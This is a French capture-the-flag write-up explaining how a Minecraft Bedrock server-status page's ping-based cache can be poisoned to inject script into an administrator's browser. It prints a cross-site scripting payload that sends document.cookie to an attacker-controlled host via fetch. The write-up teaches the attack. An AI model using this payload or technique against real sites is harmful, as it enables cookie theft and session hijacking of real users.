# BedrockMe

> Trouver un moyen de récupérer les cookies de l'administrateur qui vient régulièrement consulté le status de son serveur à l'adresse `localserver:19132`

## Solution

En analysant le code donné, on pouvait observer qu'un système de cache était mis en place. Ainsi, le status réel du serveur n'était pas demandé à chaque fois, seul une seule demande était faites: un ping du serveur. Ce ping/pong servait par la suite à récupérer le cache du serveur si disponible: l'identifiant du serveur était utilisé comme clé de cache.  

En venant entrer une adresse d'un serveur à nous qui répondait à la requête ping, nous pouvions ainsi modifier le cache et placer ce que l'on voulait dedans et ainsi, récupérer les cookies de l'administrateur. Deux solutions s'offrait à nous:
- Utiliser un serveur bedrock déjà existant ([PocketMine](https://github.com/pmmp/PocketMine-MP), [Dragonfly](https://github.com/df-mc/dragonfly)) et venir développer un plugin/modifier les propriétés permettant d'injecter du code.
- Développer un service répondant aux requêtes et permettant l'injection de code.

Le code à injecter était assez simple car une simple balise `<script>` suffisait. Il fallait ensuite récupérer les cookies et les envoyer à notre serveur. Pour cela, nous avons utilisé la fonction `fetch` de JavaScript et `webhook.site` pour récupérer les cookies. Cela pouvait donner: 
```
<script>fetch('https://mon_site?cookie='+document.cookie)</script>
```
Ainsi, tout les cookies du navigateur de l'administrateur sont transmis à notre serveur. Il ne reste plus qu'à les récupérer et trouver le flag dedans.